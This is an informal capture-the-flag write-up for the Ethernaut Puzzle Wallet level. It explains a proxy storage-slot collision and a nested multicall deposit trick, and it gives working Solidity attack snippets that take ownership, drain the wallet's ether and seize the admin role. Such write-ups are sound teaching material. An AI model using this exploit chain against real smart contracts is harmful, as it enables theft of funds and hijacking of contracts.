goal: change proxy pointer to implementation by becoming admin
function to do so: proposeNewAdmin() -> approveNewAdmin()

function to become owner: init()
-needs maxBalance == 0

function to set maxBalance = 0: setMaxBalance()
-needs address(this).balance == 0 and onlyWhitelisted

function to become whitelisted: addToWhitelist()
-needs owner, a closed loop. how then to break this contract if none of the functions are callable!?


While perusing ways to explodingKittens this proxy structure, I noticed that the proxy contract's maxBalance storage variable matches the owner storage variable. On further examination, these values match both pendingAdmin and admin storage values as well! Almost as if we're reading the from the same storage slot...

Yup. The storage variables of both contracts are overlapping. Conveniently, the only function in the proxy contract that can be called without invoking the onlyAdmin() modifier is one to propose a pendingAdmin. Lo and behold, pendingAdmin is the slot being read from (twice) to return the owner. Does that mean the storage uint256 maxBalance is what the proxy storage address admin reads from?

Why yes, yes it does. What a perfect foot in the door to maneuver deeper into the access control roles of the contract.

Let's pwn this shit!

First we need to set pendingAdmin to a malicious contract we control so that we can pass the addToWhitelist() require check that reads from the owner/pendingAdmin storage slot. Easiest way to claim ownership ever, I guess!

```function sharingStorageIsntCaring() public {
        // become owner aka pendingAdmin lol
        instance.proposeNewAdmin(address(this)); 
    }```

Okay, that was easy. Next we add ourselves to the whitelist:

```     // become whitelisted via pwnership
        instanceWallet.addToWhitelist(address(this));
```

Here comes the tricky part: we have to find a way to call the function setMaxBalance() in order to become the admin of the proxy, but it is blocking us from doing so because the contract possesses a small balance of Eth:

```require(address(this).balance == 0, "Contract balance is not 0");```

Just 0.001 ether standing in the way of KweenBirb's ascension to KweenAdministrator. This, compounded with the fact that execute(), the function that handles ether withdrawals, also appears to block any way for us to gain control of these funds:

```require(balances[msg.sender] >= value, "Insufficient balance");```

But the multicall() function just below execute() looks really juicy as it accepts a bytes[] array parameter and we know from Ethernaut's Alien Codex level that strange things can occur when you accept byte parameters; especially when there's a delegatecall in the mix!

On closer examination, we see a for loop structure that first checks for the bytes4(sha3()) function selector for this contract's deposit() method. Shit! That keeps us from calling deposit twice to reuse msg.value via delegatecall's preservation of msg.value context:

```bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }```

But multicall()'s entire purpose is to wrap multiple other function calls into one transaction, so why don't we trick the above logic by wrapping our second deposit() call into yet another multicall()? This should let us bypass the selector check above using something like this: 

multicall('deposit()', multicall('deposit()')) 

The check will only see the multicall selector when it reaches the second index in the byte array, then go on to execute a second deposit() and spoof msg.value, raising our balance above what we actually sent. To do so, we craft a specific payload doing exactly that:

```     // drain victim proxy contract balance to 0
        bytes[] memory data = new bytes[](3);
        bytes[] memory nestedData = new bytes[](1);
        data[0] = bytes(abi.encodeWithSignature("deposit()"));
        nestedData[0] = data[0];
        data[1] = bytes(abi.encodeWithSignature("multicall(bytes[])", nestedData));
        data[2] = bytes(abi.encodeWithSignature("execute(address,uint256,bytes)", address(0x0000000000000000000000000000000000000000), 0.002 ether, 'KweenBirb just pwnd u LOL'));
        instanceWallet.multicall{ value: 0.001 ether }(data);
```

You'll notice I included the execute() call that dumps the 0.002 ether to the burn address and taunts... well nobody in particular since it's an internal transaction to the burn address and nobody reads those. But KweenBirb do, and KweenBirb did, and it makes KweenBirb chuckle! Anyway, moving on: all that's left to do is ascend to KweenAdministrator. 

--note: In case you aren't familiar, ascension to Queen Administrator (descension, really) is a reference to Wildbow's flagship masterwork: "Worm"  If you like web serials, superhero sci-fi/fantasy genre, and haven't read it, go now and start it. You won't be disappointed!

```// become admin by setting maxBalance (aka admin) to KweenBirbhaxxz0r LOL
        instanceWallet.setMaxBalance(uint256(uint160(hacker)));
```

Bam. That's our pwn function in a bugshell. Congratulations on defeating the Worm by gaining administrative access to the ever-untapped power well of social coordination. Long live Khepri.